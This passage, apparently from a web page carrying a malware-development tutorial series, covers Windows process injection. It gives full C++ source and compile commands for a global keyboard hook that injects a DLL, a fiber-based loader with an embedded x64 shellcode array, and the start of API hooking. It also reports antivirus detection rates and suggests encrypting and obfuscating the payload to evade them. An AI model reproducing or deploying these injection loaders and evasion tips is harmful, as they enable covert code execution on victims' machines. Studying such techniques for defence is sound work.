+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then on victim machine let’s first launch a notepad.exe instance and then execute our program: .\hack.exe notepad.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and our payload code is still working after close victim process notepad.exe:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see our logic perfectly worked! Thread execution hijacking CreateToolhelp32Snapshot Process32First Process32Next strcmp Taking a Snapchot and Viewing Processes Thread32First</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Thread32Next CloseHandle <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code> SuspendThread GetThreadContext SetThreadContext ResumeThread “Classic” code injection “Classic” DLL injection Source code in Github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">17. classic DLL injection via SetWindowsHookEx. Simple C++ malware.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In this tutorial, I’ll take a look at the DLL injection by using the SetWindowsHookEx method. SetWindowsHookEx Let’s go to look an example which demonstrates this technique. The SetWindowsHookEx installs a hook routine into the hook chain, which is then invoked whenever certain events are triggered. Let’s take a look at the function syntax: HHOOK SetWindowsHookExA( idHook, [in] int [in] HOOKPROC lpfn, [in] HINSTANCE hmod, [in] DWORD dwThreadId ); The most important param here is idHook. The type of hook to be installed, which can hold one of the following values: WH_CALLWNDPROC WH_CALLWNDPROCRET WH_CBT WH_DEBUG WH_FOREGROUNDIDLE WH_GETMESSAGE WH_JOURNALPLAYBACK WH_JOURNALRECORD WH_KEYBOARD WH_KEYBOARD_LL WH_MOUSE</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">WH_MOUSE_LL WH_MSGFILTER WH_SHELL WH_SYSMSGFILTER In our case, I’ll be hooking the WH_KEYBOARD type of event, which will allow us to monitor keystroke messages. malicious DLL Let’s go to prepare our malicious DLL. For simplicity, we create DLL which just pop-up a message box:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">/*
+evil.cpp
+simple DLL for DLL inject to process
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/11/25/malware-injection-7.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+BOOL APIENTRY DllMain(HMODULE hModule,
+DWORD nReason, LPVOID lpReserved) {
+switch (nReason) {
+case DLL_PROCESS_ATTACH:
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
+}
+extern "C" __declspec(dllexport) int Meow() {
+MessageBox(
+NULL,
+"Meow from evil.dll!",
+"=^..^=",
+MB_OK
+);
+return 0;
+
+}
+As you can see we have a pretty simple DLL. The DllMain() function is called when the
+DLL is loaded into the process’s address space. There’s also a function named Meow(),
+which is an exported function and which is just pop-up message “Meow from evil.dll!”.
+example. simple malware.
+The next thing that we need to do is create our malware. Let’s go to look the source
+code:
+/*
+hack.cpp
+DLL inject via SetWindowsHookEx
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/11/25/malware-injection-7.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;cstdio&gt;
+typedef int (__cdecl *MeowProc)();
+int main(void) {
+HINSTANCE meowDll;
+MeowProc meowFunc;
+// load evil DLL
+meowDll = LoadLibrary(TEXT("evil.dll"));
+// get the address of exported function from evil DLL
+meowFunc = (MeowProc) GetProcAddress(meowDll, "Meow");
+// install the hook - using the WH_KEYBOARD action
+HHOOK hook = SetWindowsHookEx(WH_KEYBOARD,
+(HOOKPROC)meowFunc, meowDll, 0);
+Sleep(5*1000);
+UnhookWindowsHookEx(hook);
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">It’s also pretty simple. First of all we call <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">LoadLibrary</code> to load our malicious DLL:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, we are calling the <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code> to get the address of the exported function Meow:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">After that, the our malware calls the most important function, the SetWindowsHookEx. The parameters passed to that function determine what the function will actually do:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, whenever the keyboard event will occur, our function will be called. And we are passing the address of the our exported function - meowFunc parameter. Also we are passing the handle to our DLL - meowDll parameter. The last parameter 0 specifies that we want all programs to be hooked, not just a specific one, so it’s a global hook. Then we call Sleep:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">for demonstrate that our hook works. Then we call the UnhookWindowsHookEx() function to unhook the previously hooked WH_KEYBOARD action:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So finally after we understood entire code of the malware, we can test it. Let’s go to compile malicious DLL firstly:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">x86_64-w64-mingw32-gcc -shared -o evil.dll evil.cpp -fpermissive</code></pre>
+            </div>
+
+            <div id="compile-malware-code" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Compile malware code:</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc \ -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, see everything in action! Start our hack.exe on the victim machine (Windows</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">7 x64): .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">We can see that everything was completed successfully and at this point whenever we start a program, pop-up our message only when keyboard key is pressed.</p>
+
+            <div id="conclusion" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Conclusion</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In this section, I’ve demonstrate how we can use the SetWindowsHookEx function to inject the DLL into the process’s address space and execute arbitrary code inside the process’s address space. There is a caveat. This technique is not working in my Windows 10 x64 machine. I think the reason is this: CIG block this technique. Windows 10 x64 have two important things:</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>CFG (Control Flow Guard) – prevent indirect calls to non-approved addresses</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>CIG (Code Integrity Guard) - only allow modules signed by Microsoft/Microsoft Store/WHQL to be loaded into the process memory.</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In this presentation from BlackHat USA 2019, the authors explain that CIG block this technique. Let’s go to upload our hack.exe to virustotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/273e191999eb6a4bc010eeaf9c4e196d91750925 0f87a121fa1cfeded41b7921 So, 5 of 67 AV engines detect our file as malicious. BlackHat USA 2019 process injection techniques Gotta Catch Them All SetWindowsHookEx Using Hooks MSDN Exporting from a DLL Source code in Github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">18. code injection via windows Fibers. Simple C++ malware.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In this post, I’ll take a look at the code injection to local process through Windows Fibers API. A fiber is a unit of execution that must be manually scheduled by the application. Fibers run in the context of the threads that schedule them. example Let’s go to consider an example which demonstrate this technique. Firstly, before scheduling the first fiber, call the ConvertThreadToFiber function to create an area in which to save fiber state information:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, allocate some memory for our payload and payload is written to the allocated memory:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code> called with PAGE_EXECUTE_READWRITE parameter, which means executable, readable and writeable. The next step is create a fiber that will execute the our payload:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And finally, schedule the newly created fiber that points to our payload:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, our full source code is (hack.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+code inject via fibers
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/11/28/malware-injection-8.html
+*/
+#include &lt;windows.h&gt;
+unsigned char my_payload[] = {
+0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
+0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
+0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
+0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
+0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
+0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
+0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
+0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
+0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
+0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
+0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+
+0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
+0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
+0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
+0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
+0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
+0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
+0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+};
+unsigned int my_payload_len = sizeof(my_payload);
+int main() {
+PVOID f; // converted
+PVOID payload_mem; // memory buffer for payload
+PVOID payloadF; // fiber
+// convert main thread to fiber
+f = ConvertThreadToFiber(NULL);
+// allocate memory buffer
+payload_mem = VirtualAlloc(0, my_payload_len,
+MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+memcpy(payload_mem, my_payload, my_payload_len);
+// create a fiber that will execute payload
+payloadF = CreateFiber(NULL,
+(LPFIBER_START_ROUTINE)payload_mem,
+NULL);
+SwitchToFiber(payloadF);
+return 0;
+}
+As you can see for simplicity, we use 64-bit calc.exe as the payload. Without delving</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">into the generation of the payload, we will simply insert payload into our code:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">unsigned char my_payload[] = {
+0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
+0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
+0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+
+0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
+0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
+0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
+0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
+0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
+0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
+0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
+0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
+0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
+0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
+0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
+0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
+0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
+0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
+0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+};</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile our simple malware: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc \ -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to launch a hack.exe on windows 7 x64: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Also perfectly worked on windows 10 x64 (build 18363):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to upload our malware to virustotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/f03bdb9fa52f7b61ef03141fefff1498ad2612740b 1fdbf6941f1c5af5eee70a?nocache=1 So, 25 of 67 AV engines detect our file as malicious. For better result we can combine payload encryption with random key and obfuscate functions with another keys etc. Also we can use AES encryption for payload encryption. BlackHat USA 2019 process injection techniques Gotta Catch Them All MSDN Fibers <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code> ConvertThreadToFiber CreateFiber SwitchToFiber memcpy Source code in Github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">19. windows API hooking. Simple C++ example.</p>
+
+            <div id="what-is-api-hooking" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>What is API hooking?</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">API hooking is a technique by which we can instrument and modify the behaviour and flow of API calls. This technique is also used by many AV solutions to detect if code is malicious. example 1 Before hooking windows API functions I will consider the case of how to do this with an exported function from a DLL. For example we have DLL with this logic (pet.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pet.dll - DLL example for basic hooking
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+BOOL APIENTRY DllMain(HMODULE hModule,
+DWORD ul_reason_for_call, LPVOID lpReserved) {
+switch (ul_reason_for_call) {
+case DLL_PROCESS_ATTACH:
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+
+break;
+}
+return TRUE;
+}
+extern "C" {
+__declspec(dllexport) int _cdecl Cat(LPCTSTR say) {
+MessageBox(NULL, say, "=^..^=", MB_OK);
+return 1;
+}
+}
+extern "C" {
+__declspec(dllexport) int _cdecl Mouse(LPCTSTR say) {
+MessageBox(NULL, say, "&lt;:3()~~", MB_OK);
+return 1;
+}
+}
+extern "C" {
+__declspec(dllexport) int _cdecl Frog(LPCTSTR say) {
+MessageBox(NULL, say, "8)~", MB_OK);
+return 1;
+}
+}
+extern "C" {
+__declspec(dllexport) int _cdecl Bird(LPCTSTR say) {
+MessageBox(NULL, say, "&lt;(-)", MB_OK);
+return 1;
+}
+}
+As you can see this DLL have simplest exported functions: Cat, Mouse, Frog, Bird
+with one param say. As you can see the logic of this functions is simplest, just pop-up
+message with title.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile it:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">x86_64-w64-mingw32-gcc -shared -o pet.dll pet.cpp -fpermissive</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and then, create a simple code to validate this DLL (cat.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">#include &lt;windows.h&gt;
+typedef int (__cdecl *CatProc)(LPCTSTR say);
+typedef int (__cdecl *BirdProc)(LPCTSTR say);
+int main(void) {
+HINSTANCE petDll;
+CatProc catFunc;
+BirdProc birdFunc;
+BOOL freeRes;
+petDll = LoadLibrary("pet.dll");
+if (petDll != NULL) {
+catFunc = (CatProc) GetProcAddress(petDll, "Cat");
+birdFunc = (BirdProc) GetProcAddress(petDll, "Bird");
+if ((catFunc != NULL) &amp;&amp; (birdFunc != NULL)) {
+(catFunc) ("meow-meow");
+(catFunc) ("mmmmeow");
+(birdFunc) ("tweet-tweet");
+}
+freeRes = FreeLibrary(petDll);
+}
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile it: x86_64-w64-mingw32-g++ -O2 cat.cpp -o cat.exe \ -mconsole -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and run on Windows 7 x64: .\cat.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and as you can see, everything works as expected. Then, for example Cat function will be hooked in this scenario, but it could be any. The workflow of this technique is as follows:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">First, get memory address of the Cat function.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">then, save the first 5 bytes of the Cat function. We will need this bytes:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">then, create a myFunc function that will be executed when the original Cat is called:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">overwrite 5 bytes with a jump to myFunc:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, create a “patch”:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">in the next step, patch our Cat function (redirect Cat function to myFunc):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So what have we done here? This trick is “classic 5-byte hook” technique. If we disassemble function:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The highlighted 5 bytes is a fairly typical prologue found in many API functions. By overwriting these first 5 bytes with a jmp instruction, we are redirecting execution to our own defined function. We will save the original bytes so that they can be referenced later when we want to pass execution back to the hooked function. So firstly, we call original Cat function, set our hook and call Cat again:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Full source code is:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
